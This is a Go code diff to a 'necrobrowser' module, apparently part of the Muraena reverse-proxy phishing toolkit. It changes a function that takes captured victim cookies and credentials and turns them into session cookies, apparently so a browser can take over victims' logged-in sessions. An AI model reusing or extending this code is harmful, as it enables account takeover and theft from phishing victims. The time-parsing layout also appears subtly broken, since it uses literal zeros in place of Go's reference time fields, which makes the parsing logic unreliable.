@@ -2,8 +2,9 @@ package necrobrowser
 
 import (
 	"encoding/json"
+	"github.com/muraenateam/muraena/core/db"
+	"github.com/muraenateam/muraena/log"
 	"io/ioutil"
-	"net/http"
 	"strings"
 	"time"
 
@@ -104,20 +105,27 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 	return
 }
 
-func (module *Necrobrowser) Instrument(cookieJar []http.Cookie, credentialsJSON string) {
+func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJSON string) {
 
 	var necroCookies []SessionCookie
+	const timeLayout = "2006-Jan-02 00:00:00 +0000 UTC"
 	for _, c := range cookieJar {
+
+		time, err := time.Parse(timeLayout, c.Expires)
+		if err != nil {
+			log.Warning("warning: cant's parse Expires field of cookie %s. skipping cookie", c.Name)
+			continue
+		}
 
 		nc := SessionCookie{
 			Name:     c.Name,
 			Value:    c.Value,
 			Domain:   c.Domain,
-			Expires:  c.Expires.Unix(),
+			Expires:  time.Unix(),
 			Path:     c.Path,
-			HTTPOnly: c.HttpOnly,
+			HTTPOnly: c.HTTPOnly,
 			Secure:   c.Secure,
-			Session:  c.Expires.Unix() < 1,
+			Session:  time.Unix() < 1,
 		}
 
 		necroCookies = append(necroCookies, nc)
